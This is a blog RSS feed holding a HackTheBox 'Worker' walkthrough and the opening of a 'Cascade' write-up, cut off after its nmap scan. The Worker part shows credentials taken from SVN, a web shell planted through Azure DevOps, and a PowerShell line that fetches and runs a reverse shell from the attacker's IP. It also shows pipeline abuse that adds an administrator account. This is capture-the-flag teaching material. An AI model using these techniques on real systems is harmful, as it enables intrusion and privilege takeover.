<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>evil-winrm on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/evil-winrm/</link>
    <description>Recent content in evil-winrm on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Mon, 03 May 2021 17:01:02 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/evil-winrm/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Worker</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-worker/</link>
      <pubDate>Mon, 03 May 2021 17:01:02 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-worker/</guid>
      <description>Learn how Azure Pipelines can be abused</description>
      <content:encoded><![CDATA[<p>Worker is a medium difficulty Windows machine that features a self-hosted Apache Subversion and Azure DevOps server. Enumerating the Subversion server discovers a set of credentials and a subdomain at which the Azure DevOps is hosted. The credentials can be used to login into Azure DevOps. Dropping a web shell into one of the live sites allows me to gain foothold on the system.  Enumerating the system reveals another credentials which can also be used to login into Azure DevOps. With these credentials, I&rsquo;m able to gain administrator access through Azure Pipeline.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>SVN enumeration</li>
<li>Windows enumeration</li>
<li>Exploiting Azure Pipelines</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>svn cli client - Preinstalled in Kali Linux</li>
<li>Evil-WinRM - <a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial TCP scan with <code>nmap</code> discovers two open ports: 80 (HTTP) and 3690 (Subversion).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «worker» «10.10.14.19» 
$ nmap -sC -sV -oN worker-initial -v 10.10.10.203
<span class="c1"># Nmap 7.80 scan initiated Sun Aug 16 11:35:56 2020 as: nmap -sC -sV -oN worker-initial -v 10.10.10.203</span>
Nmap scan report <span class="k">for</span> dimension.worker.htb <span class="o">(</span>10.10.10.203<span class="o">)</span>
Host is up <span class="o">(</span>0.16s latency<span class="o">)</span>.

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
<span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="p">|</span>_http-title: Service Unavailable
3690/tcp open  svnserve Subversion
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</code></pre></div><p>Performing another scan on typical Active Directory DC ports shows only WinRM (5985) is open.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «worker» «10.10.14.19»
$ nmap -p53,445,389,5985 10.10.10.203
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-01-31 13:34 EST
Host is up <span class="o">(</span>0.013s latency<span class="o">)</span>.

PORT     STATE     SERVICE
<span class="m">53</span>       filtered  domain
<span class="m">389</span>      filtered  ldap
<span class="m">445</span>      filtered  microsoft-ds
<span class="m">5985</span>     open      wsman
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting the port 80 displays the IIS default page.</p>
<p><div class="img-container"><img src="imgs/image-20210503174900610.png" alt="image-20210503174900610"  /></div>
</p>
<h3 id="tcp-3690---subversionsvn">TCP 3690 - Subversion/SVN</h3>
<p>This is my first encounter with Subversion, it is a software for version control that is similar to git. To interact with this service, I&rsquo;ll need the Subversion client. Fortunately, it was preinstalled in Kali Linux.</p>
<p>The general usage is as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ svn &lt;sub-command&gt; svn://<span class="o">[</span>ip<span class="o">]</span>
</code></pre></div><ul>
<li>Example of subcommand: <code>ls</code>, <code>cat</code>, <code>info</code>, <code>log</code>.</li>
</ul>
<p>With the subcommand <code>ls</code>, I can list the repository contents.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «worker» «192.168.2.103»
$ svn ls svn://10.10.10.203
dimension.worker.htb/
moved.txt
</code></pre></div><p>The content of <code>moved.txt</code> tells that the svn repository is no longer maintained, and the latest repo is available at <code>http://devops.worker.htb</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
$ svn cat svn://10.10.10.203/moved.txt
This repository has been migrated and will no longer be maintaned here.
You can find the latest version at: http://devops.worker.htb

// The Worker team :<span class="o">)</span>
</code></pre></div><p>With the subcommand <code>info</code>, I find the author of the repository. It also reveals that the repository has 5 revisions (commit).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «worker» «192.168.2.103»
$ svn info svn://10.10.10.203
Path: .
URL: svn://10.10.10.203
Relative URL: ^/
Repository Root: svn://10.10.10.203
Repository UUID: 2fc74c5a-bc59-0744-a2cd-8b7d1d07c9a1
Revision: <span class="m">5</span>
Node Kind: directory
Last Changed Author: nathen
Last Changed Rev: <span class="m">5</span>
Last Changed Date: 2020-06-20 09:52:00 -0400 <span class="o">(</span>Sat, <span class="m">20</span> Jun 2020<span class="o">)</span>
</code></pre></div><p>I can check the revision log using the sub command <code>log</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «worker» «192.168.2.103»
$ svn log svn://10.10.10.203
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r5 <span class="p">|</span> nathen <span class="p">|</span> 2020–06–20 09:52:00 -0400 <span class="o">(</span>Sat, <span class="m">20</span> Jun 2020<span class="o">)</span> <span class="p">|</span> <span class="m">1</span> line
Added note that repo has been migrated
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r4 <span class="p">|</span> nathen <span class="p">|</span> 2020–06–20 09:50:20 -0400 <span class="o">(</span>Sat, <span class="m">20</span> Jun 2020<span class="o">)</span> <span class="p">|</span> <span class="m">1</span> line
Moving this repo to our new devops server which will handle the deployment <span class="k">for</span> us
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r3 <span class="p">|</span> nathen <span class="p">|</span> 2020–06–20 09:46:19 -0400 <span class="o">(</span>Sat, <span class="m">20</span> Jun 2020<span class="o">)</span> <span class="p">|</span> <span class="m">1</span> line
-
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r2 <span class="p">|</span> nathen <span class="p">|</span> 2020–06–20 09:45:16 -0400 <span class="o">(</span>Sat, <span class="m">20</span> Jun 2020<span class="o">)</span> <span class="p">|</span> <span class="m">1</span> line
Added deployment script
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r1 <span class="p">|</span> nathen <span class="p">|</span> 2020–06–20 09:43:43 -0400 <span class="o">(</span>Sat, <span class="m">20</span> Jun 2020<span class="o">)</span> <span class="p">|</span> <span class="m">1</span> line
First version
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
</code></pre></div><p>The commit message on <code>r2</code> seems interesting.</p>
<p>I can check the differences between <code>r1</code> and <code>r2</code> using the subcommand <code>diff</code>. The output shows there is a hard-coded credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «worker» «192.168.2.103»
$ svn diff -r 1:2 svn://10.10.10.203/
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210503175056134.png" alt="image-20210503175056134"  /></div>
</p>
<p>From here, I&rsquo;ll take note about what I&rsquo;ve found here.</p>
<ul>
<li>Two subdomains: <code>dimension.worker.htb</code> and <code>devops.worker.htb</code></li>
<li>A set of credentials: <code>nathen:wendel98</code></li>
</ul>
<p>I&rsquo;ll add those two subdomains to my <code>/etc/hosts</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">10.10.10.203 dimension.worker.htb devops.worker.htb
</code></pre></div><p>Then after I make sure there is nothing left, I&rsquo;ll revisit port 80 with the newly discovered subdomain.</p>
<h3 id="tcp-80---dimensionworkerhtb">TCP 80 - dimension.worker.htb</h3>
<p>Visiting <code>dimension.worker.htb</code> presented with a static page.</p>
<p><div class="img-container"><img src="imgs/image-20210503175111010.png" alt="image-20210503175111010"  /></div>
</p>
<p>It even leads to others static site (with subdomain) which I think they are just decoy.</p>
<p><div class="img-container"><img src="imgs/image-20210503175127918.png" alt="image-20210503175127918"  /></div>
</p>
<p>Before moving on, I&rsquo;ll add all the subdomains I found on <code>/#work</code> to my <code>/etc/hosts</code>. They are:</p>
<ul>
<li><code>alpha.worker.htb</code></li>
<li><code>cartoon.worker.htb</code></li>
<li><code>lens.worker.htb</code></li>
<li><code>solid-state.worker.htb</code></li>
<li><code>spectral.worker.htb</code></li>
<li><code>story.worker.htb</code></li>
</ul>
<p>Now I&rsquo;ll jump over to the mentioned DevOps server at <code>http://devops.worker.htb</code>.</p>
<h3 id="azure-devops---smarthotel360">Azure DevOps - SmartHotel360</h3>
<p>Visiting <code>http://devops.worker.htb</code> pops an authentication prompt. It logs me in after I entered the credentials I obtained from SVN, and the user, <code>nathen</code>, is currently working on a project called &ldquo;SmartHotel360&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210503175154637.png" alt="image-20210503175154637"  /></div>
</p>
<p>My first objective is to find out what permission do this user have. I clicked the project and try to lookup into the Project Settings.</p>
<p><div class="img-container"><img src="imgs/image-20210503175211414.png" alt="image-20210503175211414"  /></div>
</p>
<p>User permission or group related settings are found to be under the Security menu (Project Settings -&gt; Security Settings).</p>
<p>It seems user <code>nathen</code> is the only member of the SmartHotel360 Team.</p>
<p><div class="img-container"><img src="imgs/image-20210503175233456.png" alt="image-20210503175233456"  /></div>
</p>
<p>And the SmartHotel360 team is a member of Contributors group and Projects Valid Users, and this is added by default upon creating a team group.</p>
<p><div class="img-container"><img src="imgs/image-20210503175249455.png" alt="image-20210503175249455"  /></div>
</p>
<p>The Contributors group and Projects Valid Users group permissions are defined <a href="https://docs.microsoft.com/en-us/azure/devops/organizations/security/permissions?view=azure-devops&amp;tabs=preview-page">here</a>, and user <code>nathen</code> inherits those two groups' permission.</p>
<p><div class="img-container"><img src="imgs/image-20210503230648404.png" alt="image-20210503230648404"  /></div>
</p>
<p>From there, I try to lookup into the project&rsquo;s repository.</p>
<p>I find a bunch of website repositories on the Repos menu. These repositories are previously listed on <code>http://dimension.worker.htb/#work</code> page. User <code>nathen</code> is the author of these repositories.</p>
<p><div class="img-container"><img src="imgs/image-20210503175346216.png" alt="image-20210503175346216"  /></div>
</p>
<p>On the Pipelines menu, there are Azure Pipelines for some of the sites. Azure Pipelines is CICD feature from Azure DevOps. It is similar to GitHub Action that I use to rebuild this static site using Hugo when there is a new commit pushed into the main/master branch.</p>
<blockquote>
<p>My video recommendation about CICD: <a href="https://www.youtube.com/watch?v=scEDHsr3APg">https://www.youtube.com/watch?v=scEDHsr3APg</a></p>
</blockquote>
<p><div class="img-container"><img src="imgs/image-20210503175356998.png" alt="image-20210503175356998"  /></div>
</p>
<p>User <code>nathen</code> is allowed to queue a builds.</p>
<p><div class="img-container"><img src="imgs/image-20210503175409857.png" alt="image-20210503175409857"  /></div>
</p>
<p>With all of these permission, I can make changes such as dropping a web shell to one of the site repositories that has its own pipeline, say the alpha repository which has Alpha-CI, then I can queue those changes to the pipelines and wait until the site re-deployed/hosted. From there, I should be able to access my web-shell.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-iis-appool">Shell as IIS appool</h3>
<h4 id="webshell-upload">Webshell Upload</h4>
<p>On my first attempt, it tells me to use pull requests instead of uploading a file directly to the master branch.</p>
<p>So, I&rsquo;ll upload my web shell which is <code>cmdasp.aspx</code> (because the web server is IIS) on a new branch. I’ll be using the alpha repository.</p>
<p><div class="img-container"><img src="imgs/image-20210503175435088.png" alt="image-20210503175435088"  /></div>
</p>
<p>I&rsquo;ll pick any available work items.</p>
<p><div class="img-container"><img src="imgs/image-20210503175452577.png" alt="image-20210503175452577"  /></div>
</p>
<p>I can just drag and drop the web shell, and commit it afterwards.</p>
<p><div class="img-container"><img src="imgs/image-20210503175506892.png" alt="image-20210503175506892"  /></div>
</p>
<p>From here, I can create a pull request to the master branch to trigger the pipelines or run the Alpha-CI build manually.</p>
<p>If I choose a pull request, it needs to be reviewed first and the reviewer is the user <code>nathen</code> itself, it can decide whether to approve or reject the pull request (well, actually it was me who decide it). It then queue the build.</p>
<p><div class="img-container"><img src="imgs/image-20210503175518917.png" alt="image-20210503175518917"  /></div>
</p>
<p>The other options is with this queue builds. I can skip the review and run the queue builds for my branch (on the image it is shell branch instead of iamf).</p>
<p><div class="img-container"><img src="imgs/image-20210503175531792.png" alt="image-20210503175531792"  /></div>
</p>
<p>After the build finished, I can see my web shell is available at <code>alpha.worker.htb/cmdasp.aspx</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210503175541314.png" alt="image-20210503175541314"  /></div>
</p>
<p>To gain an interactive shell, I&rsquo;ll setup a <code>netcat</code> listener on my Kali, then I&rsquo;ll upload a <a href="https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3">PowerShell reverse shell</a> called <code>itsf.ps1</code> and execute it via the web shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&#34;mkdir c:/temp;invoke-webrequest -uri 10.10.14.19/itsf.ps1 -outfile C:\temp\itsf.ps1;C:\temp\itsf.ps1&#34;</span>
</code></pre></div><p>I have a shell now on my listener.</p>
<p><div class="img-container"><img src="imgs/image-20210503175604917.png" alt="image-20210503175604917"  /></div>
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-robisl">Shell as robisl</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>Enumerating the user groups and privileges using the <code>whoami /all</code> command reveals that IIS appool has <code>SeImpersonatePrivilege</code> which according to <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens">BookHackTrick</a>, it can be abused using RogueWinRM.</p>
<p><div class="img-container"><img src="imgs/image-20210503175615273.png" alt="image-20210503175615273"  /></div>
</p>
<p>Unfortunately, the WinRM port was already open, I couldn’t exploit it with RogueWinRM. But, I managed to find another way!</p>
<p>Enumerating the Users folder finds two users, <code>robisl</code> and <code>restorer</code> (as the name implies, it restore the box configuration, I&rsquo;ll ignore this).</p>
<p><div class="img-container"><img src="imgs/image-20210503175630874.png" alt="image-20210503175630874"  /></div>
</p>
<p>By using the <code>net</code> command, it shows that <code>robisl</code> can login remotely.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">PS C:<span class="se">\U</span>sers&gt; net user robisl
User name                    robisl
Full Name                    Robin Islip
Comment                      
User’s comment               
Country/region code          <span class="m">000</span> <span class="o">(</span>System Default<span class="o">)</span>
Account active               Yes
Account expires              Never

Password last <span class="nb">set</span>            2020-04-05 21:27:26
Password expires             Never
Password changeable          2020-04-05 21:27:26
Password required            No
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   2020-08-18 18:28:36

Logon hours allowed          All

Local Group Memberships      *Production           *Remote 
Global Group memberships     *None                 
The <span class="nb">command</span> completed successfully.
</code></pre></div><p>With <code>net</code> command, I also find there is another drive mounted as <code>W:\</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">PS C:<span class="se">\u</span>sers<span class="se">\&gt;</span>net share

Share name   Resource                        Remark

-------------------------------------------------------------------------------
C$           C:<span class="se">\ </span>                            Default share
IPC$                                         Remote IPC
W$           W:<span class="se">\ </span>                            Default share
ADMIN$       C:<span class="se">\W</span>indows                      Remote Admin
The <span class="nb">command</span> completed successfully.
</code></pre></div><p>There are 4 folders in the <code>W:\</code> drive, the one that interesting is the svnrepos folder.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">PS W:<span class="se">\&gt;</span> dir


    Directory: W:<span class="se">\
</span><span class="se"></span>

Mode                LastWriteTime         Length Name                                                             
----                -------------         ------ ----                                                             
d-----       2020-06-16     18:59                agents                                                          
d-----       2020-03-28     15:57                AzureDevOpsData                                                
d-----       2020-04-03     11:31                sites                                                          
d-----       2020-06-20     16:04                svnrepos
</code></pre></div><p>I can enumerate all folder and sub folder on the <code>W:</code> drive recursively using the <code>dir</code> command. Because I&rsquo;m on PowerShell, I have to specify <code>cmd /c</code> .</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">PS W:<span class="se">\&gt;</span> cmd.exe /c <span class="s2">&#34;dir /s /b svnrepos&#34;</span>
</code></pre></div><p>Well PowerShell can do that too.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">PS W:<span class="se">\&gt;</span> Get-ChildItem -Path W:<span class="se">\s</span>vnrepos -Filter * -Recurse -ErrorAction SilentlyContinue -Force
</code></pre></div><p>In the output, there is a <code>passwd</code> file that immediately draws my attention.</p>
<p><div class="img-container"><img src="imgs/image-20210504232344047.png" alt="image-20210504232344047"  /></div>
</p>
<p>The <code>passwd</code> file contains a bunch of credentials, one of which is a password for <code>robisl</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">PS W:<span class="se">\s</span>vnrepos<span class="se">\&gt;</span> gc .<span class="se">\w</span>ww<span class="se">\c</span>onf<span class="se">\p</span>asswd
<span class="c1">### This file is an example password file for svnserve.</span>
<span class="c1">### Its format is similar to that of svnserve.conf. As shown in the</span>
<span class="c1">### example below it contains one section labelled [users].</span>
<span class="c1">### The name and password for each user follow, one account per line.</span>

<span class="o">[</span>users<span class="o">]</span>
<span class="nv">nathen</span> <span class="o">=</span> wendel98
<span class="nv">nichin</span> <span class="o">=</span> fqerfqerf
<span class="nv">nichin</span> <span class="o">=</span> asifhiefh
<span class="nv">noahip</span> <span class="o">=</span> player
<span class="nv">nuahip</span> <span class="o">=</span> wkjdnw
<span class="nv">oakhol</span> <span class="o">=</span> bxwdjhcue
<span class="nv">owehol</span> <span class="o">=</span> supersecret
<span class="nv">paihol</span> <span class="o">=</span> painfulcode
<span class="nv">parhol</span> <span class="o">=</span> gitcommit
<span class="nv">pathop</span> <span class="o">=</span> iliketomoveit
<span class="nv">pauhor</span> <span class="o">=</span> nowayjose
<span class="nv">payhos</span> <span class="o">=</span> icanjive
<span class="nv">perhou</span> <span class="o">=</span> elvisisalive
<span class="nv">peyhou</span> <span class="o">=</span> ineedvacation
<span class="nv">phihou</span> <span class="o">=</span> pokemon
<span class="nv">quehub</span> <span class="o">=</span> pickme
<span class="nv">quihud</span> <span class="o">=</span> kindasecure
<span class="nv">rachul</span> <span class="o">=</span> guesswho
<span class="nv">raehun</span> <span class="o">=</span> idontknow
<span class="nv">ramhun</span> <span class="o">=</span> thisis
<span class="nv">ranhut</span> <span class="o">=</span> getting
<span class="nv">rebhyd</span> <span class="o">=</span> rediculous
<span class="nv">reeinc</span> <span class="o">=</span> iagree
<span class="nv">reeing</span> <span class="o">=</span> tosomepoint
<span class="nv">reiing</span> <span class="o">=</span> isthisenough
<span class="nv">renipr</span> <span class="o">=</span> dummy
<span class="nv">rhiire</span> <span class="o">=</span> users
<span class="nv">riairv</span> <span class="o">=</span> canyou
<span class="nv">ricisa</span> <span class="o">=</span> seewhich
<span class="nv">robish</span> <span class="o">=</span> onesare
<span class="nv">robisl</span> <span class="o">=</span> wolves11
<span class="nv">robive</span> <span class="o">=</span> andwhich
<span class="nv">ronkay</span> <span class="o">=</span> onesare
<span class="nv">rubkei</span> <span class="o">=</span> the
<span class="nv">rupkel</span> <span class="o">=</span> sheeps
<span class="nv">ryakel</span> <span class="o">=</span> imtired
<span class="nv">sabken</span> <span class="o">=</span> drjones
<span class="nv">samken</span> <span class="o">=</span> aqua
<span class="nv">sapket</span> <span class="o">=</span> hamburger
<span class="nv">sarkil</span> <span class="o">=</span> friday
</code></pre></div><h4 id="remote-access---robisl">Remote Access - robisl</h4>
<p>I can login remotely using <code>robisl</code> credentials with <code>evil-winrm</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «worker» «10.10.14.19»
$ evil-winrm -i 10.10.10.203 -u robisl -p wolves11

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>ocuments&gt; whoami
worker<span class="se">\r</span>obisl
*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ../Desktop
*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>esktop&gt; dir


    Directory: C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>esktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/29/2020   3:37 PM             <span class="m">34</span> user.txt
</code></pre></div><h3 id="shell-as-administrator">Shell as administrator</h3>
<h4 id="azure-devops---partsunlimited">Azure DevOps - PartsUnlimited</h4>
<p>After enumerating many things in the remote shell and coming up empty-handed, I returned to Azure DevOps, but this time with a <code>robisl</code> account.</p>
<p><div class="img-container"><img src="imgs/image-20210503175744995.png" alt="image-20210503175744995"  /></div>
</p>
<p>Long short story, <code>robisl </code> is member of Build Administrator.</p>
<p><div class="img-container"><img src="imgs/image-20210503175756504.png" alt="image-20210503175756504"  /></div>
</p>
<p>The Build Administrators defined as follows [<a href="https://docs.microsoft.com/en-us/azure/devops/organizations/security/permissions?view=azure-devops&amp;tabs=preview-page">source</a>].</p>
<p><div class="img-container"><img src="imgs/image-20210504010111041.png" alt=""  /></div>
</p>
<h4 id="exploit-azure-pipelines---read-the-root-flag">Exploit Azure Pipelines - Read the Root Flag</h4>
<p>So the plan is, I’ll create an Azure pipelines with malicious deployment script/task to execute OS commands.</p>
<p><div class="img-container"><img src="imgs/image-20210503175809136.png" alt="image-20210503175809136"  /></div>
</p>
<p>If I lookup into the agent pool in the Project Settings menu, there is an available agent named ‘Setup’. The agent is owned by an Administrator account, and as a Build Administrator member (inherited), user <code>robisl</code> also has access to it.</p>
<p><div class="img-container"><img src="imgs/image-20210503175820811.png" alt="image-20210503175820811"  /></div>
</p>
<p>So, let’s execute the plan!</p>
<p>First, I’ll create a pipeline (Pipelines -&gt; Builds -&gt;  New Pipeline).</p>
<p><div class="img-container"><img src="imgs/image-20210503175837201.png" alt="image-20210503175837201"  /></div>
</p>
<p>In the next section, I’ll choose Azure Repos Git.</p>
<p><div class="img-container"><img src="imgs/image-20210503175848517.png" alt="image-20210503175848517"  /></div>
</p>
<p>On the next one, I’ll select &ldquo;PartsUnlimited&rdquo; as the repository, because that is the repo where <code>robisl</code> is working on.</p>
<p><div class="img-container"><img src="imgs/image-20210503175906165.png" alt="image-20210503175906165"  /></div>
</p>
<p>In the Configure section, scroll down and select the starter pipeline (I forgot the name, but don&rsquo;t choose the existing one). After that, I’ll modify the pool and the script in the &ldquo;Review&rdquo; section to steal the flag.</p>
<p><div class="img-container"><img src="imgs/image-20210503175920007.png" alt="image-20210503175920007"  /></div>
</p>
<p>The master branch will be the <code>trigger</code> to run the CI\CD (If I push a changes to the &ldquo;PartsUnlimited&rdquo; repository). Since I have access to the &ldquo;Setup&rdquo; pool, I&rsquo;ll use it as the <code>pool</code>. Lastly, on the <code>steps</code> you can add a task/script you want to run/do. In my case, I want to read the root flag.</p>
<p>I’ll save it and run it on a new branch.</p>
<p><div class="img-container"><img src="imgs/image-20210503175931307.png" alt="image-20210503175931307"  /></div>
</p>
<p>I’ll just wait for the output log.</p>
<p><div class="img-container"><img src="imgs/image-20210503175944023.png" alt="image-20210503175944023"  /></div>
</p>
<p>Once it completed, I can see the root flag inside the &ldquo;Steal the flag&rdquo; output</p>
<p><div class="img-container"><img src="imgs/image-20210503175957351.png" alt="image-20210503175957351"  /></div>
</p>
<h4 id="create-user-with-administrator-privileges">Create User with Administrator Privileges</h4>
<p>I can also create a privileged user using multi-line script.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml">- <span class="nt">script</span><span class="p">:</span><span class="w"> </span><span class="l">| </span><span class="w">
</span><span class="w"></span><span class="l">net user iamf YourComplexPassword /add /domain</span><span class="w">
</span><span class="w"></span><span class="l">net localgroup Administrators iamf /add </span><span class="w">
</span><span class="w"></span><span class="l">net localgroup &#34;Remote Management Users&#34; iamf /add </span><span class="w">
</span><span class="w"></span><span class="nt">displayName</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;Set IamF to Admin&#34;</span><span class="w">
</span></code></pre></div><p>I can push it again and wait for it to complete.</p>
<p><div class="img-container"><img src="imgs/image-20210503180039057.png" alt="image-20210503180039057"  /></div>
</p>
<p>Now I can login with the newly created user.</p>
<p><div class="img-container"><img src="imgs/image-20210503180028754.png" alt="image-20210503180028754"  /></div>
</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops">https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops</a></li>
<li><a href="https://adamtheautomator.com/powershell-scripts-azure-devops-pipelines/">https://adamtheautomator.com/powershell-scripts-azure-devops-pipelines/</a></li>
<li><a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/repos/azure-repos-git?view=azure-devops&amp;tabs=yaml#ci-triggers">https://docs.microsoft.com/en-us/azure/devops/pipelines/repos/azure-repos-git?view=azure-devops&amp;tabs=yaml#ci-triggers</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Cascade</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-cascade/</link>
      <pubDate>Fri, 23 Apr 2021 17:09:02 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-cascade/</guid>
      <description>Plundering dead Active Directory accounts</description>
      <content:encoded><![CDATA[<p>Cascade is another fun Windows machine with Medium difficulty from HackTheBox created by <a href="https://vbscrub.com/">VbScrub</a>, the creator of <a href="/writeup/htb-nest">Nest</a>. It starts with by enumerating LDAP to find a custom LDAP attribute on one of the users to gain initial access to SMB shares. Enumeration on SMB discovers VNC credentials that can be decrypted using IRB. The credentials can be used to gain a foothold on the system. Another enumeration on SMB with those credentials finds a set of custom application. The database file used by the application contains an encrypted credentials of another user which can be decrypted by reversing the application. The last credentials I obtained allow me to recover the administrator password from AD Recycle Bin.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>RPC enumeration</li>
<li>Decrypting VNC password</li>
<li>Reversing .NET</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>smbclient - Preinstalled in Kali Linux</li>
<li>rpcclient - Preinstalled in Kali Linux</li>
<li>smbget - Preinstalled in Kali Linux</li>
<li>evil-winrm - <a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></li>
<li>dnSpy - <a href="https://github.com/dnSpy/dnSpy/">https://github.com/dnSpy/dnSpy/</a></li>
<li>Impacket - <a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> shows the typical port used by Active Directory domain controller.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «nmap» «192.168.43.234»
$ mkdir nmap<span class="p">;</span> nmap -sC -sV -oA nmap/initial-cascade 10.10.10.182

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span> <span class="o">(</span>Windows Server <span class="m">2008</span> R2 SP1<span class="o">)</span>
<span class="p">|</span> dns-nsid:
<span class="p">|</span>_  bind.version: Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span>
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2020-06-03 00:20:10Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: cascade.local, Site: Default-First-Site-Name<span class="o">)</span>
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: cascade.local, Site: Default-First-Site-Name<span class="o">)</span>
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
